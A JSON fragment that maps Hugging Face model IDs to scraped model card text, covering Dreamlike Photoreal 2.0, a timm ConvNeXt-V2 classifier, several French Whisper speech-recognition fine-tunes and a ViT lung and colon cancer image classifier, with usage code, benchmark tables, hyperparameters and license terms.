    "dreamlike-art/dreamlike-photoreal-2.0": "Dreamlike Photoreal 2.0 is a photorealistic model based on Stable Diffusion 1.5, made by dreamlike.art.\nExamples\ndreamlike.art\nCKPT\nSafetensors\nüß® Diffusers\nIf you want to use dreamlike models on your website/app/etc., check the license at the bottom first!\nExamples\ndreamlike.art\nCKPT\nSafetensors\nüß® Diffusers\nLicense\nDreamlike Photoreal 2.0 is a photorealistic model based on Stable Diffusion 1.5, made by dreamlike.art.\nIf you want to use dreamlike models on your website/app/etc., check the license at the bottom first!\nWarning: This model is horny! Add \"nude, naked\" to the negative prompt if want to avoid NSFW.\nYou can add photo to your prompt to make your gens look more photorealistic.Non-square aspect ratios work better for some prompts. If you want a portrait photo, try using a vertical aspect ratio. If you want a landscape photo, try using a horizontal aspect ratio.This model was trained on 768x768px images, so use 768x768px, 640x896px, 896x640px, etc. It also works pretty good with higher resolutions such as 768x1024px or 1024x768px.\nExamples\ndreamlike.art\nYou can use this model for free on dreamlike.art!\nCKPT\nDownload dreamlike-photoreal-2.0.ckpt (2.13GB)\nSafetensors\nDownload dreamlike-photoreal-2.0.safetensors (2.13GB)\nüß® Diffusers\nThis model can be used just like any other Stable Diffusion model. For more information,\nplease have a look at the Stable Diffusion Pipeline.\nfrom diffusers import StableDiffusionPipeline\nimport torch\nmodel_id = \"dreamlike-art/dreamlike-photoreal-2.0\"\npipe = StableDiffusionPipeline.from_pretrained(model_id, torch_dtype=torch.float16)\npipe = pipe.to(\"cuda\")\nprompt = \"photo, a church in the middle of a field of crops, bright cinematic lighting, gopro, fisheye lens\"\nimage = pipe(prompt).images[0]\nimage.save(\"./result.jpg\")\nLicense\nThis model is licesed under a modified CreativeML OpenRAIL-M license.\nYou are not allowed to host, finetune, or do inference with the model or its derivatives on websites/apps/etc. If you want to, please email us at contact@dreamlike.art\nYou are free to host the model card and files (Without any actual inference or finetuning) on both commercial and non-commercial websites/apps/etc.  Please state the full model name (Dreamlike Photoreal 2.0) and include the license as well as a link to the model card (https://huggingface.co/dreamlike-art/dreamlike-photoreal-2.0)\nYou are free to use the outputs (images) of the model for commercial purposes in teams of 10 or less\nYou can't use the model to deliberately produce nor share illegal or harmful outputs or content\nThe authors claims no rights on the outputs you generate, you are free to use them and are accountable for their use which must not go against the provisions set in the license\nYou may re-distribute the weights. If you do, please be aware you have to include the same use restrictions as the ones in the license and share a copy of the modified CreativeML OpenRAIL-M to all your users (please read the license entirely and carefully) Please read the full license here: https://huggingface.co/dreamlike-art/dreamlike-photoreal-2.0/blob/main/LICENSE.md",
    "timm/convnextv2_tiny.fcmae_ft_in22k_in1k": "Model card for convnextv2_tiny.fcmae_ft_in22k_in1k\nModel Details\nModel Usage\nImage Classification\nFeature Map Extraction\nImage Embeddings\nModel Comparison\nCitation\nModel card for convnextv2_tiny.fcmae_ft_in22k_in1k\nA ConvNeXt-V2 image classification model. Pretrained with a fully convolutional masked autoencoder framework (FCMAE) and fine-tuned on ImageNet-22k and then ImageNet-1k.\nModel Details\nModel Type: Image classification / feature backbone\nModel Stats:\nParams (M): 28.6\nGMACs: 4.5\nActivations (M): 13.4\nImage size: train = 224 x 224, test = 288 x 288\nPapers:\nConvNeXt V2: Co-designing and Scaling ConvNets with Masked Autoencoders: https://arxiv.org/abs/2301.00808\nOriginal: https://github.com/facebookresearch/ConvNeXt-V2\nDataset: ImageNet-1k\nPretrain Dataset: ImageNet-1k\nModel Usage\nImage Classification\nfrom urllib.request import urlopen\nfrom PIL import Image\nimport timm\nimg = Image.open(urlopen(\n'https://huggingface.co/datasets/huggingface/documentation-images/resolve/main/beignets-task-guide.png'\n))\nmodel = timm.create_model('convnextv2_tiny.fcmae_ft_in22k_in1k', pretrained=True)\nmodel = model.eval()\n# get model specific transforms (normalization, resize)\ndata_config = timm.data.resolve_model_data_config(model)\ntransforms = timm.data.create_transform(**data_config, is_training=False)\noutput = model(transforms(img).unsqueeze(0))  # unsqueeze single image into batch of 1\ntop5_probabilities, top5_class_indices = torch.topk(output.softmax(dim=1) * 100, k=5)\nFeature Map Extraction\nfrom urllib.request import urlopen\nfrom PIL import Image\nimport timm\nimg = Image.open(urlopen(\n'https://huggingface.co/datasets/huggingface/documentation-images/resolve/main/beignets-task-guide.png'\n))\nmodel = timm.create_model(\n'convnextv2_tiny.fcmae_ft_in22k_in1k',\npretrained=True,\nfeatures_only=True,\n)\nmodel = model.eval()\n# get model specific transforms (normalization, resize)\ndata_config = timm.data.resolve_model_data_config(model)\ntransforms = timm.data.create_transform(**data_config, is_training=False)\noutput = model(transforms(img).unsqueeze(0))  # unsqueeze single image into batch of 1\nfor o in output:\n# print shape of each feature map in output\n# e.g.:\n#  torch.Size([1, 96, 56, 56])\n#  torch.Size([1, 192, 28, 28])\n#  torch.Size([1, 384, 14, 14])\n#  torch.Size([1, 768, 7, 7])\nprint(o.shape)\nImage Embeddings\nfrom urllib.request import urlopen\nfrom PIL import Image\nimport timm\nimg = Image.open(urlopen(\n'https://huggingface.co/datasets/huggingface/documentation-images/resolve/main/beignets-task-guide.png'\n))\nmodel = timm.create_model(\n'convnextv2_tiny.fcmae_ft_in22k_in1k',\npretrained=True,\nnum_classes=0,  # remove classifier nn.Linear\n)\nmodel = model.eval()\n# get model specific transforms (normalization, resize)\ndata_config = timm.data.resolve_model_data_config(model)\ntransforms = timm.data.create_transform(**data_config, is_training=False)\noutput = model(transforms(img).unsqueeze(0))  # output is (batch_size, num_features) shaped tensor\n# or equivalently (without needing to set num_classes=0)\noutput = model.forward_features(transforms(img).unsqueeze(0))\n# output is unpooled, a (1, 768, 7, 7) shaped tensor\noutput = model.forward_head(output, pre_logits=True)\n# output is a (1, num_features) shaped tensor\nModel Comparison\nExplore the dataset and runtime metrics of this model in timm model results.\nAll timing numbers from eager model PyTorch 1.13 on RTX 3090 w/ AMP.\nmodel\ntop1\ntop5\nimg_size\nparam_count\ngmacs\nmacts\nsamples_per_sec\nbatch_size\nconvnextv2_huge.fcmae_ft_in22k_in1k_512\n88.848\n98.742\n512\n660.29\n600.81\n413.07\n28.58\n48\nconvnextv2_huge.fcmae_ft_in22k_in1k_384\n88.668\n98.738\n384\n660.29\n337.96\n232.35\n50.56\n64\nconvnext_xxlarge.clip_laion2b_soup_ft_in1k\n88.612\n98.704\n256\n846.47\n198.09\n124.45\n122.45\n256\nconvnext_large_mlp.clip_laion2b_soup_ft_in12k_in1k_384\n88.312\n98.578\n384\n200.13\n101.11\n126.74\n196.84\n256\nconvnextv2_large.fcmae_ft_in22k_in1k_384\n88.196\n98.532\n384\n197.96\n101.1\n126.74\n128.94\n128\nconvnext_large_mlp.clip_laion2b_soup_ft_in12k_in1k_320\n87.968\n98.47\n320\n200.13\n70.21\n88.02\n283.42\n256\nconvnext_xlarge.fb_in22k_ft_in1k_384\n87.75\n98.556\n384\n350.2\n179.2\n168.99\n124.85\n192\nconvnextv2_base.fcmae_ft_in22k_in1k_384\n87.646\n98.422\n384\n88.72\n45.21\n84.49\n209.51\n256\nconvnext_large.fb_in22k_ft_in1k_384\n87.476\n98.382\n384\n197.77\n101.1\n126.74\n194.66\n256\nconvnext_large_mlp.clip_laion2b_augreg_ft_in1k\n87.344\n98.218\n256\n200.13\n44.94\n56.33\n438.08\n256\nconvnextv2_large.fcmae_ft_in22k_in1k\n87.26\n98.248\n224\n197.96\n34.4\n43.13\n376.84\n256\nconvnext_base.clip_laion2b_augreg_ft_in12k_in1k_384\n87.138\n98.212\n384\n88.59\n45.21\n84.49\n365.47\n256\nconvnext_xlarge.fb_in22k_ft_in1k\n87.002\n98.208\n224\n350.2\n60.98\n57.5\n368.01\n256\nconvnext_base.fb_in22k_ft_in1k_384\n86.796\n98.264\n384\n88.59\n45.21\n84.49\n366.54\n256\nconvnextv2_base.fcmae_ft_in22k_in1k\n86.74\n98.022\n224\n88.72\n15.38\n28.75\n624.23\n256\nconvnext_large.fb_in22k_ft_in1k\n86.636\n98.028\n224\n197.77\n34.4\n43.13\n581.43\n256\nconvnext_base.clip_laiona_augreg_ft_in1k_384\n86.504\n97.97\n384\n88.59\n45.21\n84.49\n368.14\n256\nconvnext_base.clip_laion2b_augreg_ft_in12k_in1k\n86.344\n97.97\n256\n88.59\n20.09\n37.55\n816.14\n256\nconvnextv2_huge.fcmae_ft_in1k\n86.256\n97.75\n224\n660.29\n115.0\n79.07\n154.72\n256\nconvnext_small.in12k_ft_in1k_384\n86.182\n97.92\n384\n50.22\n25.58\n63.37\n516.19\n256\nconvnext_base.clip_laion2b_augreg_ft_in1k\n86.154\n97.68\n256\n88.59\n20.09\n37.55\n819.86\n256\nconvnext_base.fb_in22k_ft_in1k\n85.822\n97.866\n224\n88.59\n15.38\n28.75\n1037.66\n256\nconvnext_small.fb_in22k_ft_in1k_384\n85.778\n97.886\n384\n50.22\n25.58\n63.37\n518.95\n256\nconvnextv2_large.fcmae_ft_in1k\n85.742\n97.584\n224\n197.96\n34.4\n43.13\n375.23\n256\nconvnext_small.in12k_ft_in1k\n85.174\n97.506\n224\n50.22\n8.71\n21.56\n1474.31\n256\nconvnext_tiny.in12k_ft_in1k_384\n85.118\n97.608\n384\n28.59\n13.14\n39.48\n856.76\n256\nconvnextv2_tiny.fcmae_ft_in22k_in1k_384\n85.112\n97.63\n384\n28.64\n13.14\n39.48\n491.32\n256\nconvnextv2_base.fcmae_ft_in1k\n84.874\n97.09\n224\n88.72\n15.38\n28.75\n625.33\n256\nconvnext_small.fb_in22k_ft_in1k\n84.562\n97.394\n224\n50.22\n8.71\n21.56\n1478.29\n256\nconvnext_large.fb_in1k\n84.282\n96.892\n224\n197.77\n34.4\n43.13\n584.28\n256\nconvnext_tiny.in12k_ft_in1k\n84.186\n97.124\n224\n28.59\n4.47\n13.44\n2433.7\n256\nconvnext_tiny.fb_in22k_ft_in1k_384\n84.084\n97.14\n384\n28.59\n13.14\n39.48\n862.95\n256\nconvnextv2_tiny.fcmae_ft_in22k_in1k\n83.894\n96.964\n224\n28.64\n4.47\n13.44\n1452.72\n256\nconvnext_base.fb_in1k\n83.82\n96.746\n224\n88.59\n15.38\n28.75\n1054.0\n256\nconvnextv2_nano.fcmae_ft_in22k_in1k_384\n83.37\n96.742\n384\n15.62\n7.22\n24.61\n801.72\n256\nconvnext_small.fb_in1k\n83.142\n96.434\n224\n50.22\n8.71\n21.56\n1464.0\n256\nconvnextv2_tiny.fcmae_ft_in1k\n82.92\n96.284\n224\n28.64\n4.47\n13.44\n1425.62\n256\nconvnext_tiny.fb_in22k_ft_in1k\n82.898\n96.616\n224\n28.59\n4.47\n13.44\n2480.88\n256\nconvnext_nano.in12k_ft_in1k\n82.282\n96.344\n224\n15.59\n2.46\n8.37\n3926.52\n256\nconvnext_tiny_hnf.a2h_in1k\n82.216\n95.852\n224\n28.59\n4.47\n13.44\n2529.75\n256\nconvnext_tiny.fb_in1k\n82.066\n95.854\n224\n28.59\n4.47\n13.44\n2346.26\n256\nconvnextv2_nano.fcmae_ft_in22k_in1k\n82.03\n96.166\n224\n15.62\n2.46\n8.37\n2300.18\n256\nconvnextv2_nano.fcmae_ft_in1k\n81.83\n95.738\n224\n15.62\n2.46\n8.37\n2321.48\n256\nconvnext_nano_ols.d1h_in1k\n80.866\n95.246\n224\n15.65\n2.65\n9.38\n3523.85\n256\nconvnext_nano.d1h_in1k\n80.768\n95.334\n224\n15.59\n2.46\n8.37\n3915.58\n256\nconvnextv2_pico.fcmae_ft_in1k\n80.304\n95.072\n224\n9.07\n1.37\n6.1\n3274.57\n256\nconvnext_pico.d1_in1k\n79.526\n94.558\n224\n9.05\n1.37\n6.1\n5686.88\n256\nconvnext_pico_ols.d1_in1k\n79.522\n94.692\n224\n9.06\n1.43\n6.5\n5422.46\n256\nconvnextv2_femto.fcmae_ft_in1k\n78.488\n93.98\n224\n5.23\n0.79\n4.57\n4264.2\n256\nconvnext_femto_ols.d1_in1k\n77.86\n93.83\n224\n5.23\n0.82\n4.87\n6910.6\n256\nconvnext_femto.d1_in1k\n77.454\n93.68\n224\n5.22\n0.79\n4.57\n7189.92\n256\nconvnextv2_atto.fcmae_ft_in1k\n76.664\n93.044\n224\n3.71\n0.55\n3.81\n4728.91\n256\nconvnext_atto_ols.a2_in1k\n75.88\n92.846\n224\n3.7\n0.58\n4.11\n7963.16\n256\nconvnext_atto.d2_in1k\n75.664\n92.9\n224\n3.7\n0.55\n3.81\n8439.22\n256\nCitation\n@article{Woo2023ConvNeXtV2,\ntitle={ConvNeXt V2: Co-designing and Scaling ConvNets with Masked Autoencoders},\nauthor={Sanghyun Woo, Shoubhik Debnath, Ronghang Hu, Xinlei Chen, Zhuang Liu, In So Kweon and Saining Xie},\nyear={2023},\njournal={arXiv preprint arXiv:2301.00808},\n}\n@misc{rw2019timm,\nauthor = {Ross Wightman},\ntitle = {PyTorch Image Models},\nyear = {2019},\npublisher = {GitHub},\njournal = {GitHub repository},\ndoi = {10.5281/zenodo.4414861},\nhowpublished = {\\url{https://github.com/huggingface/pytorch-image-models}}\n}",
    "bofenghuang/whisper-small-cv11-french": "Fine-tuned whisper-small model for ASR in French\nPerformance\nUsage\nFine-tuned whisper-small model for ASR in French\nThis model is a fine-tuned version of openai/whisper-small, trained on the mozilla-foundation/common_voice_11_0 fr dataset. When using the model make sure that your speech input is also sampled at 16Khz. This model also predicts casing and punctuation.\nPerformance\nBelow are the WERs of the pre-trained models on the Common Voice 9.0, Multilingual LibriSpeech, Voxpopuli and Fleurs. These results are reported in the original paper.\nModel\nCommon Voice 9.0\nMLS\nVoxPopuli\nFleurs\nopenai/whisper-small\n22.7\n16.2\n15.7\n15.0\nopenai/whisper-medium\n16.0\n8.9\n12.2\n8.7\nopenai/whisper-large\n14.7\n8.9\n11.0\n7.7\nopenai/whisper-large-v2\n13.9\n7.3\n11.4\n8.3\nBelow are the WERs of the fine-tuned models on the Common Voice 11.0, Multilingual LibriSpeech, Voxpopuli, and Fleurs. Note that these evaluation datasets have been filtered and preprocessed to only contain French alphabet characters and are removed of punctuation outside of apostrophe. The results in the table are reported as WER (greedy search) / WER (beam search with beam width 5).\nModel\nCommon Voice 11.0\nMLS\nVoxPopuli\nFleurs\nbofenghuang/whisper-small-cv11-french\n11.76 / 10.99\n9.65 / 8.91\n14.45 / 13.66\n10.76 / 9.83\nbofenghuang/whisper-medium-cv11-french\n9.03 / 8.54\n6.34 / 5.86\n11.64 / 11.35\n7.13 / 6.85\nbofenghuang/whisper-medium-french\n9.03 / 8.73\n4.60 / 4.44\n9.53 / 9.46\n6.33 / 5.94\nbofenghuang/whisper-large-v2-cv11-french\n8.05 / 7.67\n5.56 / 5.28\n11.50 / 10.69\n5.42 / 5.05\nbofenghuang/whisper-large-v2-french\n8.15 / 7.83\n4.20 / 4.03\n9.10 / 8.66\n5.22 / 4.98\nUsage\nInference with ü§ó Pipeline\nimport torch\nfrom datasets import load_dataset\nfrom transformers import pipeline\ndevice = torch.device(\"cuda:0\" if torch.cuda.is_available() else \"cpu\")\n# Load pipeline\npipe = pipeline(\"automatic-speech-recognition\", model=\"bofenghuang/whisper-small-cv11-french\", device=device)\n# NB: set forced_decoder_ids for generation utils\npipe.model.config.forced_decoder_ids = pipe.tokenizer.get_decoder_prompt_ids(language=\"fr\", task=\"transcribe\")\n# Load data\nds_mcv_test = load_dataset(\"mozilla-foundation/common_voice_11_0\", \"fr\", split=\"test\", streaming=True)\ntest_segment = next(iter(ds_mcv_test))\nwaveform = test_segment[\"audio\"]\n# Run\ngenerated_sentences = pipe(waveform, max_new_tokens=225)[\"text\"]  # greedy\n# generated_sentences = pipe(waveform, max_new_tokens=225, generate_kwargs={\"num_beams\": 5})[\"text\"]  # beam search\n# Normalise predicted sentences if necessary\nInference with ü§ó low-level APIs\nimport torch\nimport torchaudio\nfrom datasets import load_dataset\nfrom transformers import AutoProcessor, AutoModelForSpeechSeq2Seq\ndevice = torch.device(\"cuda:0\" if torch.cuda.is_available() else \"cpu\")\n# Load model\nmodel = AutoModelForSpeechSeq2Seq.from_pretrained(\"bofenghuang/whisper-small-cv11-french\").to(device)\nprocessor = AutoProcessor.from_pretrained(\"bofenghuang/whisper-small-cv11-french\", language=\"french\", task=\"transcribe\")\n# NB: set forced_decoder_ids for generation utils\nmodel.config.forced_decoder_ids = processor.get_decoder_prompt_ids(language=\"fr\", task=\"transcribe\")\n# 16_000\nmodel_sample_rate = processor.feature_extractor.sampling_rate\n# Load data\nds_mcv_test = load_dataset(\"mozilla-foundation/common_voice_11_0\", \"fr\", split=\"test\", streaming=True)\ntest_segment = next(iter(ds_mcv_test))\nwaveform = torch.from_numpy(test_segment[\"audio\"][\"array\"])\nsample_rate = test_segment[\"audio\"][\"sampling_rate\"]\n# Resample\nif sample_rate != model_sample_rate:\nresampler = torchaudio.transforms.Resample(sample_rate, model_sample_rate)\nwaveform = resampler(waveform)\n# Get feat\ninputs = processor(waveform, sampling_rate=model_sample_rate, return_tensors=\"pt\")\ninput_features = inputs.input_features\ninput_features = input_features.to(device)\n# Generate\ngenerated_ids = model.generate(inputs=input_features, max_new_tokens=225)  # greedy\n# generated_ids = model.generate(inputs=input_features, max_new_tokens=225, num_beams=5)  # beam search\n# Detokenize\ngenerated_sentences = processor.batch_decode(generated_ids, skip_special_tokens=True)[0]\n# Normalise predicted sentences if necessary",
    "bofenghuang/whisper-medium-cv11-french": "Fine-tuned whisper-medium model for ASR in French\nPerformance\nUsage\nFine-tuned whisper-medium model for ASR in French\nThis model is a fine-tuned version of openai/whisper-medium, trained on the mozilla-foundation/common_voice_11_0 fr dataset. When using the model make sure that your speech input is also sampled at 16Khz. This model also predicts casing and punctuation.\nPerformance\nBelow are the WERs of the pre-trained models on the Common Voice 9.0, Multilingual LibriSpeech, Voxpopuli and Fleurs. These results are reported in the original paper.\nModel\nCommon Voice 9.0\nMLS\nVoxPopuli\nFleurs\nopenai/whisper-small\n22.7\n16.2\n15.7\n15.0\nopenai/whisper-medium\n16.0\n8.9\n12.2\n8.7\nopenai/whisper-large\n14.7\n8.9\n11.0\n7.7\nopenai/whisper-large-v2\n13.9\n7.3\n11.4\n8.3\nBelow are the WERs of the fine-tuned models on the Common Voice 11.0, Multilingual LibriSpeech, Voxpopuli, and Fleurs. Note that these evaluation datasets have been filtered and preprocessed to only contain French alphabet characters and are removed of punctuation outside of apostrophe. The results in the table are reported as WER (greedy search) / WER (beam search with beam width 5).\nModel\nCommon Voice 11.0\nMLS\nVoxPopuli\nFleurs\nbofenghuang/whisper-small-cv11-french\n11.76 / 10.99\n9.65 / 8.91\n14.45 / 13.66\n10.76 / 9.83\nbofenghuang/whisper-medium-cv11-french\n9.03 / 8.54\n6.34 / 5.86\n11.64 / 11.35\n7.13 / 6.85\nbofenghuang/whisper-medium-french\n9.03 / 8.73\n4.60 / 4.44\n9.53 / 9.46\n6.33 / 5.94\nbofenghuang/whisper-large-v2-cv11-french\n8.05 / 7.67\n5.56 / 5.28\n11.50 / 10.69\n5.42 / 5.05\nbofenghuang/whisper-large-v2-french\n8.15 / 7.83\n4.20 / 4.03\n9.10 / 8.66\n5.22 / 4.98\nUsage\nInference with ü§ó Pipeline\nimport torch\nfrom datasets import load_dataset\nfrom transformers import pipeline\ndevice = torch.device(\"cuda:0\" if torch.cuda.is_available() else \"cpu\")\n# Load pipeline\npipe = pipeline(\"automatic-speech-recognition\", model=\"bofenghuang/whisper-medium-cv11-french\", device=device)\n# NB: set forced_decoder_ids for generation utils\npipe.model.config.forced_decoder_ids = pipe.tokenizer.get_decoder_prompt_ids(language=\"fr\", task=\"transcribe\")\n# Load data\nds_mcv_test = load_dataset(\"mozilla-foundation/common_voice_11_0\", \"fr\", split=\"test\", streaming=True)\ntest_segment = next(iter(ds_mcv_test))\nwaveform = test_segment[\"audio\"]\n# Run\ngenerated_sentences = pipe(waveform, max_new_tokens=225)[\"text\"]  # greedy\n# generated_sentences = pipe(waveform, max_new_tokens=225, generate_kwargs={\"num_beams\": 5})[\"text\"]  # beam search\n# Normalise predicted sentences if necessary\nInference with ü§ó low-level APIs\nimport torch\nimport torchaudio\nfrom datasets import load_dataset\nfrom transformers import AutoProcessor, AutoModelForSpeechSeq2Seq\ndevice = torch.device(\"cuda:0\" if torch.cuda.is_available() else \"cpu\")\n# Load model\nmodel = AutoModelForSpeechSeq2Seq.from_pretrained(\"bofenghuang/whisper-medium-cv11-french\").to(device)\nprocessor = AutoProcessor.from_pretrained(\"bofenghuang/whisper-medium-cv11-french\", language=\"french\", task=\"transcribe\")\n# NB: set forced_decoder_ids for generation utils\nmodel.config.forced_decoder_ids = processor.get_decoder_prompt_ids(language=\"fr\", task=\"transcribe\")\n# 16_000\nmodel_sample_rate = processor.feature_extractor.sampling_rate\n# Load data\nds_mcv_test = load_dataset(\"mozilla-foundation/common_voice_11_0\", \"fr\", split=\"test\", streaming=True)\ntest_segment = next(iter(ds_mcv_test))\nwaveform = torch.from_numpy(test_segment[\"audio\"][\"array\"])\nsample_rate = test_segment[\"audio\"][\"sampling_rate\"]\n# Resample\nif sample_rate != model_sample_rate:\nresampler = torchaudio.transforms.Resample(sample_rate, model_sample_rate)\nwaveform = resampler(waveform)\n# Get feat\ninputs = processor(waveform, sampling_rate=model_sample_rate, return_tensors=\"pt\")\ninput_features = inputs.input_features\ninput_features = input_features.to(device)\n# Generate\ngenerated_ids = model.generate(inputs=input_features, max_new_tokens=225)  # greedy\n# generated_ids = model.generate(inputs=input_features, max_new_tokens=225, num_beams=5)  # beam search\n# Detokenize\ngenerated_sentences = processor.batch_decode(generated_ids, skip_special_tokens=True)[0]\n# Normalise predicted sentences if necessary",
    "bofenghuang/whisper-medium-french": "Fine-tuned whisper-medium model for ASR in French\nPerformance\nUsage\nFine-tuned whisper-medium model for ASR in French\nThis model is a fine-tuned version of openai/whisper-medium, trained on a composite dataset comprising of over 2200 hours of French speech audio, using the train and the validation splits of Common Voice 11.0, Multilingual LibriSpeech, Voxpopuli, Fleurs, Multilingual TEDx, MediaSpeech, and African Accented French. When using the model make sure that your speech input is sampled at 16Khz. This model doesn't predict casing or punctuation.\nPerformance\nBelow are the WERs of the pre-trained models on the Common Voice 9.0, Multilingual LibriSpeech, Voxpopuli and Fleurs. These results are reported in the original paper.\nModel\nCommon Voice 9.0\nMLS\nVoxPopuli\nFleurs\nopenai/whisper-small\n22.7\n16.2\n15.7\n15.0\nopenai/whisper-medium\n16.0\n8.9\n12.2\n8.7\nopenai/whisper-large\n14.7\n8.9\n11.0\n7.7\nopenai/whisper-large-v2\n13.9\n7.3\n11.4\n8.3\nBelow are the WERs of the fine-tuned models on the Common Voice 11.0, Multilingual LibriSpeech, Voxpopuli, and Fleurs. Note that these evaluation datasets have been filtered and preprocessed to only contain French alphabet characters and are removed of punctuation outside of apostrophe. The results in the table are reported as WER (greedy search) / WER (beam search with beam width 5).\nModel\nCommon Voice 11.0\nMLS\nVoxPopuli\nFleurs\nbofenghuang/whisper-small-cv11-french\n11.76 / 10.99\n9.65 / 8.91\n14.45 / 13.66\n10.76 / 9.83\nbofenghuang/whisper-medium-cv11-french\n9.03 / 8.54\n6.34 / 5.86\n11.64 / 11.35\n7.13 / 6.85\nbofenghuang/whisper-medium-french\n9.03 / 8.73\n4.60 / 4.44\n9.53 / 9.46\n6.33 / 5.94\nbofenghuang/whisper-large-v2-cv11-french\n8.05 / 7.67\n5.56 / 5.28\n11.50 / 10.69\n5.42 / 5.05\nbofenghuang/whisper-large-v2-french\n8.15 / 7.83\n4.20 / 4.03\n9.10 / 8.66\n5.22 / 4.98\nUsage\nInference with ü§ó Pipeline\nimport torch\nfrom datasets import load_dataset\nfrom transformers import pipeline\ndevice = torch.device(\"cuda:0\" if torch.cuda.is_available() else \"cpu\")\n# Load pipeline\npipe = pipeline(\"automatic-speech-recognition\", model=\"bofenghuang/whisper-medium-french\", device=device)\n# NB: set forced_decoder_ids for generation utils\npipe.model.config.forced_decoder_ids = pipe.tokenizer.get_decoder_prompt_ids(language=\"fr\", task=\"transcribe\")\n# Load data\nds_mcv_test = load_dataset(\"mozilla-foundation/common_voice_11_0\", \"fr\", split=\"test\", streaming=True)\ntest_segment = next(iter(ds_mcv_test))\nwaveform = test_segment[\"audio\"]\n# Run\ngenerated_sentences = pipe(waveform, max_new_tokens=225)[\"text\"]  # greedy\n# generated_sentences = pipe(waveform, max_new_tokens=225, generate_kwargs={\"num_beams\": 5})[\"text\"]  # beam search\n# Normalise predicted sentences if necessary\nInference with ü§ó low-level APIs\nimport torch\nimport torchaudio\nfrom datasets import load_dataset\nfrom transformers import AutoProcessor, AutoModelForSpeechSeq2Seq\ndevice = torch.device(\"cuda:0\" if torch.cuda.is_available() else \"cpu\")\n# Load model\nmodel = AutoModelForSpeechSeq2Seq.from_pretrained(\"bofenghuang/whisper-medium-french\").to(device)\nprocessor = AutoProcessor.from_pretrained(\"bofenghuang/whisper-medium-french\", language=\"french\", task=\"transcribe\")\n# NB: set forced_decoder_ids for generation utils\nmodel.config.forced_decoder_ids = processor.get_decoder_prompt_ids(language=\"fr\", task=\"transcribe\")\n# 16_000\nmodel_sample_rate = processor.feature_extractor.sampling_rate\n# Load data\nds_mcv_test = load_dataset(\"mozilla-foundation/common_voice_11_0\", \"fr\", split=\"test\", streaming=True)\ntest_segment = next(iter(ds_mcv_test))\nwaveform = torch.from_numpy(test_segment[\"audio\"][\"array\"])\nsample_rate = test_segment[\"audio\"][\"sampling_rate\"]\n# Resample\nif sample_rate != model_sample_rate:\nresampler = torchaudio.transforms.Resample(sample_rate, model_sample_rate)\nwaveform = resampler(waveform)\n# Get feat\ninputs = processor(waveform, sampling_rate=model_sample_rate, return_tensors=\"pt\")\ninput_features = inputs.input_features\ninput_features = input_features.to(device)\n# Generate\ngenerated_ids = model.generate(inputs=input_features, max_new_tokens=225)  # greedy\n# generated_ids = model.generate(inputs=input_features, max_new_tokens=225, num_beams=5)  # beam search\n# Detokenize\ngenerated_sentences = processor.batch_decode(generated_ids, skip_special_tokens=True)[0]\n# Normalise predicted sentences if necessary",
    "DunnBC22/vit-base-patch16-224-in21k_lung_and_colon_cancer": "vit-base-patch16-224-in21k_lung_and_colon_cancer\nModel description\nIntended uses & limitations\nTraining and evaluation data\nTraining procedure\nTraining hyperparameters\nTraining results\nFramework versions\nvit-base-patch16-224-in21k_lung_and_colon_cancer\nThis model is a fine-tuned version of google/vit-base-patch16-224-in21k.\nIt achieves the following results on the evaluation set:\nLoss: 0.0016\nAccuracy: 0.9994\nF1\nWeighted: 0.9994\nMicro: 0.9994\nMacro: 0.9994\nRecall\nWeighted: 0.9994\nMicro: 0.9994\nMacro: 0.9994\nPrecision\nWeighted: 0.9994\nMicro: 0.9994\nMacro: 0.9994\nModel description\nThis is a multiclass image classification model of lung and colon cancers.\nFor more information on how it was created, check out the following link: https://github.com/DunnBC22/Vision_Audio_and_Multimodal_Projects/blob/main/Computer%20Vision/Image%20Classification/Multiclass%20Classification/Lung%20%26%20Colon%20Cancer/Lung_and_colon_cancer_ViT.ipynb\nIntended uses & limitations\nThis model is intended to demonstrate my ability to solve a complex problem using technology.\nTraining and evaluation data\nDataset Source: https://www.kaggle.com/datasets/andrewmvd/lung-and-colon-cancer-histopathological-images\nSample Images From Dataset:\nTraining procedure\nTraining hyperparameters\nThe following hyperparameters were used during training:\nlearning_rate: 0.0002\ntrain_batch_size: 16\neval_batch_size: 8\nseed: 42\noptimizer: Adam with betas=(0.9,0.999) and epsilon=1e-08\nlr_scheduler_type: linear\nnum_epochs: 3\nTraining results\nTraining Loss\nEpoch\nStep\nValidation Loss\nAccuracy\nWeighted F1\nMicro F1\nMacro F1\nWeighted Recall\nMicro Recall\nMacro Recall\nWeighted Precision\nMicro Precision\nMacro Precision\n0.0574\n1.0\n1250\n0.0410\n0.9864\n0.9864\n0.9864\n0.9865\n0.9864\n0.9864\n0.9864\n0.9872\n0.9864\n0.9875\n0.0031\n2.0\n2500\n0.0105\n0.9972\n0.9972\n0.9972\n0.9972\n0.9972\n0.9972\n0.9973\n0.9972\n0.9972\n0.9972\n0.0007\n3.0\n3750\n0.0016\n0.9994\n0.9994\n0.9994\n0.9994\n0.9994\n0.9994\n0.9994\n0.9994\n0.9994\n0.9994\nFramework versions\nTransformers 4.22.2\nPytorch 1.12.1\nDatasets 2.5.2\nTokenizers 0.12.1"
}